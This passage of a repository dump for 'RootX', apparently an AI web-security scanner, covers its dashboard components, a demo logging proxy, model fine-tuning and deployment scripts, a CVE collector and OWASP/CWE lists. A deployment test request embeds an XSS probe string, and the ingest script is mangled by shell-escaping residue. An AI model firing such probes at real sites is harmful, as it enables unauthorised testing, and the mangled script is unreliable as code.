                    {Object.entries(SEVERITY_COLORS).map(([severity, color]) => (<Cell key={severity} fill={color} />))}
                  </Pie>
                  <Tooltip />
                </PieChart>
              </ResponsiveContainer>
            </div>
            <div className="p-4 bg-white/5 border border-white/10 rounded-xl">
              <h3 className="text-sm font-medium mb-4">Top Vulnerabilities</h3>
              <ResponsiveContainer width="100%" height={200}>
                <BarChart data={getTopVulns().slice(0, 5)}>
                  <CartesianGrid strokeDasharray="3 3" stroke="#ffffff10" />
                  <XAxis dataKey="type" tick={{ fontSize: 10, fill: "#9ca3af" }} />
                  <YAxis tick={{ fontSize: 10, fill: "#9ca3af" }} />
                  <Tooltip />
                  <Bar dataKey="count" fill="#06b6d4" radius={[4, 4, 0, 0]} />
                </BarChart>
              </ResponsiveContainer>
            </div>
          </div>

          {/* Vulnerabilities List */}
          <div className="space-y-2">
            <div className="flex items-center justify-between">
              <h3 className="text-sm font-medium">All Vulnerabilities ({result.vulnerabilities?.length || 0})</h3>
              <button onClick={downloadReport} className="flex items-center gap-1 px-3 py-1.5 text-xs bg-white/5 border border-white/10 rounded-lg hover:bg-white/10 transition-all"><Download className="w-3 h-3" /> JSON Report</button>
            </div>
            {result.vulnerabilities?.map((v: any, i: number) => (
              <motion.div key={i} initial={{ opacity: 0, x: -10 }} animate={{ opacity: 1, x: 0 }} transition={{ delay: i * 0.02 }}
                onClick={() => setShowDetail(showDetail === `${i}` ? null : `${i}`)}
                className="cursor-pointer flex items-start gap-3 p-3 bg-white/[0.03] border border-white/5 rounded-lg hover:bg-white/[0.06] transition-all"
              >
                <div className="w-2 h-2 mt-1.5 rounded-full flex-shrink-0" style={{ backgroundColor: SEVERITY_COLORS[v.severity?.toLowerCase()] || "#6b7280" }} />
                <div className="flex-1 min-w-0">
                  <div className="flex items-center gap-2">
                    <span className="text-sm font-medium text-gray-200">{v.type || "Unknown"}</span>
                    <span className={`text-[10px] px-1.5 py-0.5 rounded font-medium uppercase ${v.severity === "critical" ? "text-red-400 bg-red-500/10" : v.severity === "high" ? "text-orange-400 bg-orange-500/10" : v.severity === "medium" ? "text-yellow-400 bg-yellow-500/10" : "text-gray-400 bg-gray-500/10"}`}>{v.severity || "info"}</span>
                  </div>
                  <p className="text-xs text-gray-400 mt-0.5 truncate">{v.detail || v.description || ""}</p>
                </div>
                <span className="text-xs text-gray-500 flex-shrink-0">Risk: {v.riskScore ?? "?"}</span>
              </motion.div>
            ))}
          </div>
        </motion.div>
      )}
    </div>
  );
}
```

## 📁 `frontend/components/Sidebar.tsx`

```tsx
"use client";

import Link from "next/link";
import { usePathname } from "next/navigation";
import { Shield, Home, LayoutDashboard, MessageSquare, History, Settings, Terminal, Server, Activity, ChevronLeft, ChevronRight, Bug } from "lucide-react";

const navItems = [
  { href: "/", icon: Home, label: "Home" },
  { href: "/dashboard", icon: LayoutDashboard, label: "Dashboard" },
  { href: "/chat", icon: MessageSquare, label: "AI Chat" },
  { href: "/history", icon: History, label: "History" },
  { href: "/protected", icon: Shield, label: "Shield Test" },
  { href: "/mitm", icon: Terminal, label: "MITM Proxy" },
  { href: "/settings", icon: Settings, label: "Settings" },
];

interface SidebarProps { isOpen: boolean; onToggle: () => void; }

export default function Sidebar({ isOpen, onToggle }: SidebarProps) {
  const pathname = usePathname();

  return (
    <aside className={`relative flex flex-col border-r border-white/5 bg-black/40 backdrop-blur-xl transition-all duration-300 ${isOpen ? "w-56" : "w-16"}`}>
      <div className="flex items-center justify-between p-4 border-b border-white/5">
        {isOpen && <div className="flex items-center gap-2"><Shield className="w-5 h-5 text-cyan-400" /><span className="text-sm font-bold bg-gradient-to-r from-cyan-400 to-blue-600 bg-clip-text text-transparent">RootX</span></div>}
        <button onClick={onToggle} className="p-1.5 rounded-lg hover:bg-white/5 transition-colors">
          {isOpen ? <ChevronLeft className="w-4 h-4 text-gray-400" /> : <ChevronRight className="w-4 h-4 text-gray-400" />}
        </button>
      </div>
      <nav className="flex-1 p-2 space-y-1">
        {navItems.map((item) => {
          const isActive = pathname === item.href || (item.href !== "/" && pathname.startsWith(item.href));
          return (
            <Link key={item.href} href={item.href}
              className={`flex items-center gap-3 px-3 py-2.5 rounded-lg text-xs font-medium transition-all ${isActive ? "bg-cyan-500/15 text-cyan-300 border border-cyan-500/20" : "text-gray-400 hover:text-gray-200 hover:bg-white/5"}`}
            >
              <item.icon className="w-4 h-4 flex-shrink-0" />
              {isOpen && <span>{item.label}</span>}
            </Link>
          );
        })}
      </nav>
      {isOpen && (
        <div className="p-4 border-t border-white/5">
          <div className="flex items-center gap-2 px-2 py-2 text-xs text-gray-500"><Activity className="w-3 h-3" /> System Active</div>
        </div>
      )}
    </aside>
  );
}
```

## 📁 `frontend/components/Navbar.tsx`

```tsx
"use client";

import { Shield, Bell, Activity } from "lucide-react";

interface NavbarProps { title: string; }

export default function Navbar({ title }: NavbarProps) {
  return (
    <header className="flex items-center justify-between px-6 py-4 border-b border-white/5 bg-black/40 backdrop-blur-xl">
      <div className="flex items-center gap-3">
        <Shield className="w-5 h-5 text-cyan-400" />
        <h1 className="text-base font-semibold">{title}</h1>
      </div>
      <div className="flex items-center gap-3">
        <button className="p-2 rounded-lg hover:bg-white/5 transition-colors relative">
          <Bell className="w-4 h-4 text-gray-400" />
          <span className="absolute top-1 right-1 w-2 h-2 bg-red-500 rounded-full" />
        </button>
        <div className="flex items-center gap-2 px-3 py-1.5 bg-white/5 border border-white/10 rounded-lg">
          <Activity className="w-3 h-3 text-green-400" />
          <span className="text-xs text-green-400">Live</span>
        </div>
      </div>
    </header>
  );
}
```

## 📁 `frontend/components/Slidebar.tsx`

```tsx
"use client";

import Link from "next/link";
import { usePathname } from "next/navigation";
import { Shield, LayoutDashboard, MessageSquare, History, Settings, Terminal, Activity, ChevronLeft, Home, Bug } from "lucide-react";
import { useState } from "react";

const navItems = [
  { href: "/", icon: Home, label: "Home" },
  { href: "/dashboard", icon: LayoutDashboard, label: "Dashboard" },
  { href: "/chat", icon: MessageSquare, label: "AI Chat" },
  { href: "/history", icon: History, label: "History" },
  { href: "/protected", icon: Shield, label: "Shield Test" },
  { href: "/mitm", icon: Terminal, label: "MITM" },
  { href: "/settings", icon: Settings, label: "Settings" },
];

export default function Slidebar() {
  const [collapsed, setCollapsed] = useState(false);
  const pathname = usePathname();

  return (
    <aside className={`flex flex-col border-r border-white/5 bg-black/40 backdrop-blur-xl transition-all duration-300 ${collapsed ? "w-16" : "w-56"}`}>
      <div className="flex items-center justify-between p-4 border-b border-white/5">
        {!collapsed && <div className="flex items-center gap-2"><Shield className="w-5 h-5 text-cyan-400" /><span className="text-sm font-bold bg-gradient-to-r from-cyan-400 to-blue-600 bg-clip-text text-transparent">RootX</span></div>}
        <button onClick={() => setCollapsed(!collapsed)} className="p-1.5 rounded-lg hover:bg-white/5 transition-colors"><ChevronLeft className={`w-4 h-4 text-gray-400 transition-transform ${collapsed ? "rotate-180" : ""}`} /></button>
      </div>
      <nav className="flex-1 p-2 space-y-1">
        {navItems.map((item) => {
          const isActive = pathname === item.href || (item.href !== "/" && pathname.startsWith(item.href));
          return (
            <Link key={item.href} href={item.href}
              className={`flex items-center gap-3 px-3 py-2.5 rounded-lg text-xs font-medium transition-all ${isActive ? "bg-cyan-500/15 text-cyan-300 border border-cyan-500/20" : "text-gray-400 hover:text-gray-200 hover:bg-white/5"}`}
            >
              <item.icon className="w-4 h-4 flex-shrink-0" />
              {!collapsed && <span>{item.label}</span>}
            </Link>
          );
        })}
      </nav>
    </aside>
  );
}
```

## 📁 `frontend/components/RootXBadge.tsx`

```tsx
import { Shield } from "lucide-react";

export default function RootXBadge({ size = "sm", showText = true }: { size?: "sm" | "md" | "lg"; showText?: boolean }) {
  const sizeMap = { sm: "w-5 h-5", md: "w-7 h-7", lg: "w-10 h-10" };
  return (
    <div className="inline-flex items-center gap-2">
      <div className={`${sizeMap[size]} rounded-lg bg-gradient-to-br from-cyan-500 to-blue-600 flex items-center justify-center`}>
        <Shield className="w-3/4 h-3/4 text-white" />
      </div>
      {showText && <span className="font-bold bg-gradient-to-r from-cyan-400 to-blue-600 bg-clip-text text-transparent">RootX</span>}
    </div>
  );
}
```

## 📁 `frontend/next.config.js`

```js
/** @type {import('next').NextConfig} */
const nextConfig = {
  output: 'export',
  images: { unoptimized: true },
  trailingSlash: true,
};

module.exports = nextConfig;
```

## 📁 `frontend/tsconfig.json`

```json
{
  "compilerOptions": {
    "target": "ES2017",
    "lib": ["dom", "dom.iterable", "esnext"],
    "allowJs": true,
    "skipLibCheck": true,
    "strict": true,
    "noEmit": true,
    "esModuleInterop": true,
    "module": "esnext",
    "moduleResolution": "bundler",
    "resolveJsonModule": true,
    "isolatedModules": true,
    "jsx": "preserve",
    "incremental": true,
    "plugins": [{ "name": "next" }],
    "paths": { "@/*": ["./*"] }
  },
  "include": ["next-env.d.ts", "**/*.ts", "**/*.tsx", ".next/types/**/*.ts"],
  "exclude": ["node_modules"]
}
```

## 📁 `frontend/postcss.config.mjs`

```js
/** @type {import('postcss-load-config').Config} */
const config = {
  plugins: {
    tailwindcss: {},
    autoprefixer: {},
  },
};

export default config;
```

## 📁 `frontend/package.json`

```json
{
  "name": "rootx-frontend",
  "version": "3.0.0",
  "private": true,
  "scripts": {
    "dev": "next dev",
    "build": "next build",
    "start": "next start",
    "lint": "next lint"
  },
  "dependencies": {
    "next": "^14.2.0",
    "react": "^18.3.0",
    "react-dom": "^18.3.0",
    "framer-motion": "^11.0.0",
    "lucide-react": "^0.400.0",
    "recharts": "^2.12.0",
    "socket.io-client": "^4.7.0",
    "@supabase/supabase-js": "^2.45.0"
  },
  "devDependencies": {
    "typescript": "^5.4.0",
    "@types/node": "^20.0.0",
    "@types/react": "^18.3.0",
    "@types/react-dom": "^18.3.0",
    "tailwindcss": "^3.4.0",
    "postcss": "^8.4.0",
    "autoprefixer": "^10.4.0"
  }
}
```

## 📁 `frontend/mitm-proxy.js`

```js
const http = require('http');
const https = require('https');
const urlMod = require('url');
const { WebSocketServer } = require('ws');

const PROXY_PORT = 8080;
const WS_PORT = 8081;

// Simple HTTP/HTTPS forward proxy for demo / Juice Shop
const server = http.createServer((req, res) => {
  // Log request
  console.log(`[MITM] ${req.method} ${req.url}`);

  const parsed = urlMod.parse(req.url);
  const options = {
    hostname: parsed.hostname,
    port: parsed.port || 80,
    path: parsed.path,
    method: req.method,
    headers: req.headers,
  };

  const proxyReq = http.request(options, (proxyRes) => {
    res.writeHead(proxyRes.statusCode, proxyRes.headers);
    proxyRes.pipe(res, { end: true });
  });

  req.pipe(proxyReq, { end: true });

  proxyReq.on('error', (err) => {
    console.error('[MITM] Error:', err.message);
    res.writeHead(502);
    res.end('Proxy error');
  });
});

// WebSocket server for streaming logs to frontend
const wss = new WebSocketServer({ port: WS_PORT });
wss.on('connection', (ws) => {
  console.log('[MITM WS] Client connected');
  ws.on('close', () => console.log('[MITM WS] Client disconnected'));
});

// Broadcast log to all WS clients
function broadcast(msg) {
  wss.clients.forEach((client) => {
    if (client.readyState === 1) client.send(msg);
  });
}

server.listen(PROXY_PORT, () => {
  console.log(`[MITM] Proxy running on http://localhost:${PROXY_PORT}`);
  console.log(`[MITM WS] Log server on ws://localhost:${WS_PORT}`);
});

// Intercept and log (this is a demo proxy, not a full MITM)
const originalRequest = http.request;
http.request = function(options, callback) {
  const start = Date.now();
  const req = originalRequest(options, callback);
  req.on('response', (res) => {
    const duration = Date.now() - start;
    const host = typeof options === 'string' ? options : options.hostname || 'unknown';
    broadcast(JSON.stringify({ method: req.method, host, status: res.statusCode, duration: `${duration}ms` }));
  });
  return req;
};
```

## 📁 `frontend/eslint.config.mjs`

```js
import { dirname } from "path";
import { fileURLToPath } from "url";
import { FlatCompat } from "@eslint/eslintrc";

const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);

const compat = new FlatCompat({ baseDirectory: __dirname });

const eslintConfig = [...compat.extends("next/core-web-vitals")];

export default eslintConfig;
```

## 📁 `frontend/.gitignore`

```
# dependencies
/node_modules
/.pnp
.pnp.js
.next/

# testing
/coverage

# next.js
/.next/
/out/

# production
/build

# misc
.DS_Store
*.pem

# debug
npm-debug.log*
yarn-debug.log*
yarn-error.log*

# local env files
.env*.local
.env

# vercel
.vercel

# typescript
*.tsbuildinfo
next-env.d.ts
```

---

## 📁 `training/scripts/finetune.py`

```python
import os
import json
import torch
import gc
from datasets import Dataset
from transformers import (
    AutoModelForCausalLM,
    AutoTokenizer,
    BitsAndBytesConfig,
    TrainingArguments,
    pipeline,
)
from peft import LoraConfig, get_peft_model, prepare_model_for_kbit_training
from trl import SFTTrainer

CHECKPOINT_DIR = "checkpoints"
FINAL_DIR = "rootx-llm-final"
os.makedirs(CHECKPOINT_DIR, exist_ok=True)
os.makedirs(FINAL_DIR, exist_ok=True)

# ─── Config ───────────────────────────────────────────────────
BASE_MODEL = "mistralai/Mistral-7B-Instruct-v0.3"
DATASET_PATH = "training_data.jsonl"
USE_QLORA = True
USE_AMP = True

# Training hyperparams
EPOCHS = 3
BATCH_SIZE = 2
GRAD_ACCUM = 4
LR = 2e-4
MAX_SEQ_LENGTH = 1024
SAVE_STEPS = 100
LOGGING_STEPS = 10

# AMD MI300X optimization (ROCm)
os.environ["HIP_VISIBLE_DEVICES"] = "0"
os.environ["TORCH_BACKEND"] = "hip"
os.environ["HIP_OPTIMIZER"] = "1"

# ─── Load & prepare dataset ──────────────────────────────────
def load_dataset(path):
    data = []
    with open(path, "r", encoding="utf-8") as f:
        for line in f:
            line = line.strip()
            if line:
                data.append(json.loads(line))
    return Dataset.from_list(data)

dataset = load_dataset(DATASET_PATH)

# ─── Quantization config (QLoRA) ─────────────────────────────
bnb_config = None
if USE_QLORA:
    bnb_config = BitsAndBytesConfig(
        load_in_4bit=True,
        bnb_4bit_quant_type="nf4",
        bnb_4bit_compute_dtype=torch.float16 if USE_AMP else torch.bfloat16,
        bnb_4bit_use_double_quant=True,
    )

# ─── Load tokenizer ──────────────────────────────────────────
tokenizer = AutoTokenizer.from_pretrained(BASE_MODEL, trust_remote_code=True)
tokenizer.pad_token = tokenizer.eos_token
tokenizer.padding_side = "right"

# ─── Format prompt function ──────────────────────────────────
def format_prompt(example):
    prompt = f"### Instruction:\n{example['instruction']}\n\n### Input:\n{example['input']}\n\n### Response:\n{example['output']}"
    return {"text": prompt}

dataset = dataset.map(format_prompt)

# ─── Load model ──────────────────────────────────────────────
model = AutoModelForCausalLM.from_pretrained(
    BASE_MODEL,
    quantization_config=bnb_config,
    device_map="auto",
    trust_remote_code=True,
    torch_dtype=torch.float16 if USE_AMP else torch.bfloat16,
)

model = prepare_model_for_kbit_training(model)

# ─── LoRA config ─────────────────────────────────────────────
lora_config = LoraConfig(
    r=16,
    lora_alpha=32,
    target_modules=["q_proj", "k_proj", "v_proj", "o_proj", "gate_proj", "up_proj", "down_proj"],
    lora_dropout=0.05,
    bias="none",
    task_type="CAUSAL_LM",
)

model = get_peft_model(model, lora_config)
model.print_trainable_parameters()

# ─── Training arguments ──────────────────────────────────────
training_args = TrainingArguments(
    output_dir=CHECKPOINT_DIR,
    num_train_epochs=EPOCHS,
    per_device_train_batch_size=BATCH_SIZE,
    gradient_accumulation_steps=GRAD_ACCUM,
    warmup_steps=20,
    learning_rate=LR,
    logging_steps=LOGGING_STEPS,
    save_steps=SAVE_STEPS,
    save_total_limit=3,
    fp16=USE_AMP,
    bf16=not USE_AMP,
    optim="paged_adamw_8bit",
    report_to="none",
    dataloader_num_workers=2,
    remove_unused_columns=False,
    gradient_checkpointing=True,
)

# ─── Trainer ─────────────────────────────────────────────────
trainer = SFTTrainer(
    model=model,
    tokenizer=tokenizer,
    args=training_args,
    train_dataset=dataset,
    max_seq_length=MAX_SEQ_LENGTH,
    dataset_text_field="text",
)

# ─── Train ───────────────────────────────────────────────────
print("Starting training...")
trainer.train()

# ─── Save ────────────────────────────────────────────────────
print(f"Saving model to {FINAL_DIR}...")
trainer.save_model(FINAL_DIR)
tokenizer.save_pretrained(FINAL_DIR)

# ─── Inference test ──────────────────────────────────────────
print("\nRunning inference test...")
pipe = pipeline("text-generation", model=model, tokenizer=tokenizer, device=0)
test_prompt = "### Instruction:\nAnalyze this URL for SQL injection vulnerabilities.\n\n### Input:\nhttps://example.com/page?id=1\n\n### Response:\n"
result = pipe(test_prompt, max_new_tokens=200, do_sample=True, temperature=0.7)
print(result[0]['generated_text'])

print("Done! Model saved to", FINAL_DIR)
gc.collect()
torch.cuda.empty_cache()
```

## 📁 `training/scripts/merge_dataset.js`

```js
const fs = require('fs');
const path = require('path');

const SOURCES_DIR = './sources';
const OUTPUT_FILE = './training_data.jsonl';

const extensions = ['.json', '.jsonl', '.txt'];

function loadSource(filePath) {
  const ext = path.extname(filePath);
  const content = fs.readFileSync(filePath, 'utf-8');
  const records = [];

  switch (ext) {
    case '.json':
      const json = JSON.parse(content);
      if (Array.isArray(json)) records.push(...json);
      else records.push(json);
      break;
    case '.jsonl':
      content.split('\n').filter(l => l.trim()).forEach(l => records.push(JSON.parse(l)));
      break;
    case '.txt':
      records.push({ instruction: 'Security analysis', input: content.substring(0, 2000), output: 'Analyzed.' });
      break;
  }

  return records;
}

function convertToTrainingFormat(record) {
  // Normalise various field names to instruction/input/output
  return {
    instruction: record.instruction || record.prompt || record.question || record.system_message || '',
    input: record.input || record.context || record.conversation || record.text || '',
    output: record.output || record.response || record.completion || record.answer || record.content || '',
  };
}

async function main() {
  const files = fs.readdirSync(SOURCES_DIR).filter(f => extensions.includes(path.extname(f)));
  const allRecords = [];

  for (const file of files) {
    const filePath = path.join(SOURCES_DIR, file);
    try {
      const records = loadSource(filePath);
      const converted = records.map(convertToTrainingFormat);
      allRecords.push(...converted);
      console.log(`Loaded ${converted.length} records from ${file}`);
    } catch (err) {
      console.error(`Error loading ${file}:`, err.message);
    }
  }

  const outStream = fs.createWriteStream(OUTPUT_FILE);
  for (const record of allRecords) {
    outStream.write(JSON.stringify(record) + '\n');
  }
  outStream.end();

  console.log(`\nMerged ${allRecords.length} total records into ${OUTPUT_FILE}`);
}

main().catch(console.error);
```

## 📁 `training/scripts/deploy_amd.sh`

```bash
#!/bin/bash
# RootX AMD MI300X Deployment Script
# Deploys the fine-tuned RootX LLM on AMD MI300X with ROCm + vLLM

set -e

MODEL_PATH="${1:-./rootx-llm-final}"
PORT="${2:-8000}"
GPU_COUNT="${3:-1}"

echo "=== RootX AMD MI300X Deployment ==="
echo "Model: $MODEL_PATH"
echo "Port: $PORT"
echo "GPUs: $GPU_COUNT"

# 1. Check ROCm
if command -v rocminfo &> /dev/null; then
    echo "[OK] ROCm detected"
    rocminfo | grep "Name:" | head -5
else
    echo "[ERROR] ROCm not found. Install ROCm 6.0+ from https://rocm.docs.amd.com"
    exit 1
fi

# 2. Check GPUs
GPU_COUNT_AVAIL=$(rocm-smi --showid 2>/dev/null | grep "GPU ID" | wc -l)
echo "Available GPUs: $GPU_COUNT_AVAIL"

if [ "$GPU_COUNT_AVAIL" -lt "$GPU_COUNT" ]; then
    echo "[WARN] Requested $GPU_COUNT GPUs but only $GPU_COUNT_AVAIL available"
fi

# 3. Install dependencies
pip install vllm flask sentencepiece transformers

# 4. Start vLLM server in background
echo "Starting vLLM server..."
CUDA_VISIBLE_DEVICES=0 python -m vllm.entrypoints.openai.api_server \
    --model "$MODEL_PATH" \
    --port "$PORT" \
    --tensor-parallel-size "$GPU_COUNT" \
    --gpu-memory-utilization 0.90 \
    --max-model-len 4096 \
    --dtype float16 \
    --enforce-eager &

VLLM_PID=$!
echo "vLLM PID: $VLLM_PID"

# 5. Wait for server
echo "Waiting for server to start..."
for i in $(seq 1 30); do
    if curl -s "http://localhost:$PORT/v1/models" > /dev/null 2>&1; then
        echo "Server is ready!"
        break
    fi
    sleep 2
done

# 6. Test inference
echo "Testing inference..."
curl -s "http://localhost:$PORT/v1/chat/completions" \
    -H "Content-Type: application/json" \
    -d '{
        "model": "'"$MODEL_PATH"'",
        "messages": [{"role": "user", "content": "Analyze this URL for XSS: https://example.com/search?q=<script>alert(1)</script>"}],
        "max_tokens": 200
    }' | python -m json.tool

echo ""
echo "=== Deployment Complete ==="
echo "API: http://localhost:$PORT/v1"
echo "vLLM PID: $VLLM_PID"
echo "To stop: kill $VLLM_PID"
```

## 📁 `training/scripts/cve_collector.js`

```js
const fs = require('fs');
const https = require('https');

const NVD_API_KEY = process.env.NVD_API_KEY || '';
const BASE_URL = 'https://services.nvd.nist.gov/rest/json/cves/2.0';
const OUTPUT_FILE = './cve_data.jsonl';
const RESULTS_PER_PAGE = 20;
const MAX_PAGES = 5;

const SEARCH_KEYWORDS = [
  'SQL injection', 'cross-site scripting', 'XSS', 'remote code execution',
  'buffer overflow', 'command injection', 'path traversal', 'CSRF',
  'SSRF', 'authentication bypass', 'privilege escalation',
];

function sleep(ms) { return new Promise(resolve => setTimeout(resolve, ms)); }

function fetchCVEs(keyword, startIndex = 0) {
  return new Promise((resolve, reject) => {
    const params = new URLSearchParams({
      keywordSearch: keyword,
      resultsPerPage: RESULTS_PER_PAGE,
      startIndex,
    });
    if (NVD_API_KEY) params.append('apiKey', NVD_API_KEY);

    const url = `${BASE_URL}?${params}`;
    https.get(url, { headers: { 'User-Agent': 'RootX-CVE-Collector/1.0' } }, (res) => {
      let data = '';
      res.on('data', chunk => data += chunk);
      res.on('end', () => {
        try { resolve(JSON.parse(data)); }
        catch { reject(new Error('Failed to parse NVD response')); }
      });
    }).on('error', reject);
  });
}

function cveToTrainingRecord(cve) {
  const { id, descriptions, metrics, weaknesses } = cve;
  const description = descriptions?.find(d => d.lang === 'en')?.value || '';
  const cvssScore = metrics?.cvssMetricV31?.[0]?.cvssData?.baseScore ||
                    metrics?.cvssMetricV30?.[0]?.cvssData?.baseScore ||
                    metrics?.cvssMetricV2?.[0]?.cvssData?.baseScore || 'N/A';
  const cwe = weaknesses?.[0]?.description?.[0]?.value || 'N/A';

  return {
    instruction: 'Analyze this CVE vulnerability and suggest remediation steps.',
    input: `CVE ID: ${id}\nDescription: ${description}\nCVSS Score: ${cvssScore}\nCWE: ${cwe}`,
    output: `This vulnerability (${id}) has a CVSS score of ${cvssScore} and is categorized as ${cwe}. ${description.substring(0, 300)} Recommended actions: apply vendor patches, update affected software, implement WAF rules if applicable.`,
  };
}

async function main() {
  const allRecords = [];
  
  for (const keyword of SEARCH_KEYWORDS) {
    console.log(`Searching CVE for: ${keyword}`);
    
    for (let page = 0; page < MAX_PAGES; page++) {
      try {
        const data = await fetchCVEs(keyword, page * RESULTS_PER_PAGE);
        const cves = data.vulnerabilities || [];
        
        if (cves.length === 0) break;
        
        for (const item of cves) {
          const record = cveToTrainingRecord(item.cve);
          allRecords.push(record);
        }
        
        console.log(`  Page ${page + 1}: ${cves.length} CVEs`);
        await sleep(600); // Rate limiting
      } catch (err) {
        console.error(`  Error on page ${page}:`, err.message);
        break;
      }
    }
  }
  
  // Write to file
  const outStream = fs.createWriteStream(OUTPUT_FILE);
  for (const record of allRecords) {
    outStream.write(JSON.stringify(record) + '\n');
  }
  outStream.end();
  
  console.log(`\nCollected ${allRecords.length} total CVE records → ${OUTPUT_FILE}`);
}

main().catch(console.error);
```

## 📁 `training/data/owasp_top10.json`

```json
[
  { "id": "A01", "name": "Broken Access Control", "description": "Failures in enforcing user permissions, allowing unauthorized access to data or functionality.", "risk": "Critical" },
  { "id": "A02", "name": "Cryptographic Failures", "description": "Weak or missing encryption for sensitive data in transit or at rest.", "risk": "High" },
  { "id": "A03", "name": "Injection", "description": "SQL, NoSQL, OS command, and LDAP injection vulnerabilities from untrusted data.", "risk": "Critical" },
  { "id": "A04", "name": "Insecure Design", "description": "Architectural flaws in application design leading to security gaps.", "risk": "High" },
  { "id": "A05", "name": "Security Misconfiguration", "description": "Default credentials, unnecessary features, unpatched systems, and verbose errors.", "risk": "High" },
  { "id": "A06", "name": "Vulnerable and Outdated Components", "description": "Using libraries or frameworks with known vulnerabilities.", "risk": "High" },
  { "id": "A07", "name": "Identification and Authentication Failures", "description": "Weak password policies, session management flaws, and credential stuffing.", "risk": "Critical" },
  { "id": "A08", "name": "Software and Data Integrity Failures", "description": "Insecure CI/CD pipelines, unsigned updates, and deserialization flaws.", "risk": "High" },
  { "id": "A09", "name": "Security Logging and Monitoring Failures", "description": "Insufficient logging, monitoring, and incident response capabilities.", "risk": "Medium" },
  { "id": "A10", "name": "Server-Side Request Forgery (SSRF)", "description": "Application fetches remote resources without validating the URL.", "risk": "High" }
]
```

## 📁 `training/data/cwe_top25.json`

```json
[
  { "id": "CWE-787", "name": "Out-of-bounds Write", "rank": 1 },
  { "id": "CWE-79", "name": "Cross-site Scripting", "rank": 2 },
  { "id": "CWE-89", "name": "SQL Injection", "rank": 3 },
  { "id": "CWE-416", "name": "Use After Free", "rank": 4 },
  { "id": "CWE-78", "name": "OS Command Injection", "rank": 5 },
  { "id": "CWE-20", "name": "Improper Input Validation", "rank": 6 },
  { "id": "CWE-125", "name": "Out-of-bounds Read", "rank": 7 },
  { "id": "CWE-22", "name": "Path Traversal", "rank": 8 },
  { "id": "CWE-352", "name": "Cross-Site Request Forgery", "rank": 9 },
  { "id": "CWE-434", "name": "Unrestricted File Upload", "rank": 10 },
  { "id": "CWE-862", "name": "Missing Authorization", "rank": 11 },
  { "id": "CWE-476", "name": "NULL Pointer Dereference", "rank": 12 },
  { "id": "CWE-287", "name": "Improper Authentication", "rank": 13 },
  { "id": "CWE-190", "name": "Integer Overflow", "rank": 14 },
  { "id": "CWE-502", "name": "Deserialization of Untrusted Data", "rank": 15 },
  { "id": "CWE-77", "name": "Command Injection", "rank": 16 },
  { "id": "CWE-119", "name": "Buffer Overflow", "rank": 17 },
  { "id": "CWE-798", "name": "Hard-coded Credentials", "rank": 18 },
  { "id": "CWE-918", "name": "Server-Side Request Forgery", "rank": 19 },
  { "id": "CWE-306", "name": "Missing Authentication", "rank": 20 },
  { "id": "CWE-362", "name": "Race Condition", "rank": 21 },
  { "id": "CWE-269", "name": "Privilege Escalation", "rank": 22 },
  { "id": "CWE-94", "name": "Code Injection", "rank": 23 },
  { "id": "CWE-863", "name": "Incorrect Authorization", "rank": 24 },
  { "id": "CWE-276", "name": "Incorrect Default Permissions", "rank": 25 }
]
```

## 📁 `training/output/stats.json`

```json
{
  "files": {
    "attack_payloads.jsonl": 45,
    "code_vulns.jsonl": 45,
    "incident_response.jsonl": 22,
    "owasp_knowledge.jsonl": 10,
    "security_qa.jsonl": 55
  },
  "total": 177,
  "train": 160,
  "validation": 17,
  "timestamp": "2026-06-14T04:50:58.784Z"
}
```

## 📁 `scripts/ingest-security.js`

```js
import { ChromaClient } from '\''chromadb'\'';
import fs from '\''fs/promises'\'';
import path from '\''path'\'';

const client = new ChromaClient({ path: '\''http://localhost:8000'\'' });
const COLLECTION_NAME = '\''rootx-security'\'';

async function ensureCollection() {
  try { return await client.getCollection({ name: COLLECTION_NAME }); }
  catch { return await client.createCollection({ name: COLLECTION_NAME }); }
}

function chunkText(text, maxLength = 500) {
  const chunks = [];
  const sentences = text.split(/(?<=[.!?])\s+/);
  let currentChunk = '\'''\'';
  for (const sentence of sentences) {
    if (currentChunk.length + sentence.length > maxLength && currentChunk.length > 0) {
      chunks.push(currentChunk.trim());
      currentChunk = sentence;
    } else { currentChunk += (currentChunk ? '\'' '\'' : '\'''\'') + sentence; }
  }
  if (currentChunk.trim()) chunks.push(currentChunk.trim());
  return chunks;
}

async function ingestFile(collection, filePath, source, type) {
  const content = await fs.readFile(filePath, '\''utf-8'\'');
  const lines = content.trim().split('\''\\n'\'').filter(l => l.trim());
  const allDocs = [], allIds = [], allMetadatas = [];
  for (let i = 0; i < lines.length; i++) {
    try {
      const item = JSON.parse(lines[i]);
      let text = '\'''\'';
      if (item.instruction && item.output) text = `Q: ${item.instruction}\\nA: ${item.output}`;
      else if (item.question && item.answer) text = `Q: ${item.question}\\nA: ${item.answer}`;
      else if (item.vulnerability && item.fix) text = `Vulnerability: ${item.vulnerability}\\nCWE: ${item.cwe || '\''N/A'\''}\\nBad: ${item.bad}\\nGood: ${item.good}\\nExplanation: ${item.explanation}`;
      else if (typeof item === '\''object'\'') text = JSON.stringify(item);
      else text = String(item);
      const chunks = chunkText(text);
      for (let j = 0; j < chunks.length; j++) {
        allDocs.push(chunks[j]);
        allIds.push(`${source}-${i}-${j}`);
        allMetadatas.push({ source, type, line: i, chunk: j, totalChunks: chunks.length });
      }
    } catch (e) { console.warn(`Skipping invalid JSON at line ${i + 1} in ${source}:`, e.message); }
  }
  if (allDocs.length > 0) {
    await collection.add({ ids: allIds, documents: allDocs, metadatas: allMetadatas });
    console.log(`Added ${allDocs.length} chunks from ${source} (${lines.length} records)`);
  }
}

async function main() {
  const collection = await ensureCollection();
  const dataDir = path.join(process.cwd(), '\''training'\'', '\''data'\'');
  const files = [
    { file: '\''cwe_top25.json'\'', type: '\''cwe'\'' },
    { file: '\''owasp_top10.json'\'', type: '\''owasp'\'' },
    { file: '\''secure_patterns_js.json'\'', type: '\''pattern'\'', lang: '\''javascript'\'' },
  ];
  for (const { file, type } of files) {
    const fp = path.join(dataDir, file);
    try { await fs.access(fp); await ingestFile(collection, fp, file, type); }
    catch (e) { if (e.code === '\''ENOENT'\'') console.log(`Skipping missing file: ${file}`); }
  }
  const count = await collection.count();
  console.log(`Complete! Total documents: ${count}`);
}

main().catch(console.error);
```

## 📁 `frontend/CLAUDE.md`

```
@AGENTS.md
```

## 📁 `frontend/AGENTS.md`

```
<!-- BEGIN:nextjs-agent-rules -->
# This is NOT the Next.js you know

This version has breaking changes — APIs, conventions, and file structure may all differ from your training data. Read the relevant guide in `node_modules/next/dist/docs/` before writing any code. Heed deprecation notices.
